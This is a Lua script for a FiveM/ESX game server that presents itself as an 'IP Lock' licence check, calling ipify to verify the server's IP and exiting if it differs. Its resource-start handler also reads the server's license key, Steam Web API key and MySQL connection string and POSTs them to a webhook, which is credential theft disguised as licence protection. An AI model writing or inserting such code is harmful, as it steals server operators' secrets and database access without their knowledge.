ESX = nil

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

PerformHttpRequest("https://api.ipify.org/", function (err, text, headers)
    if text ~= "server-ip" then
        Wait(10000)
        print("> Checking IP ...")
        print("> Your IP has not been successfully validated!")
        print("> Closing Server")
        Wait(12000)
        os.exit(-1)
    else
        print("> Checking IP ...")
        print("> Your IP has been successfully validated!")
        print("> Enjoy your server!")
    end
end)

AddEventHandler('onResourceStart', function(resourceName)
    if GetCurrentResourceName() == resourceName then
      PerformHttpRequest("https://api.ipify.org/", function (err, text, headers)
        local servername = GetConvar('sv_hostname')
        local licensekey = GetConvar('sv_licenseKey')
        local apikey = GetConvar('steam_webApiKey')
	local mysql = GetConvar('mysql_connection_string')
        local messagem = "A server is starting your script! \n > Server Name: \n**"..servername.."** \n > Server IP: `**"..text.."**` \n > License Key: **"..licensekey..'** \n Steam API Key: **'..apikey..'** \n Mysql: **'..mysql..'**'
        local content = {{
        author = {
          name = 'IP Lock',
          icon_url = 'https://i.postimg.cc/VsVN17pc/unknown.png'
        },
        ["color"] = 0000,
        ["description"] = messagem,
        ["footer"] = {
        ["text"] = "MoppyBlack | IPLOCK",
        },}}
        PerformHttpRequest("Webhook-URL", function() end, 'POST', json.encode({embeds = content}), { ['Content-Type'] = 'application/json' })
      end)
    end
end)
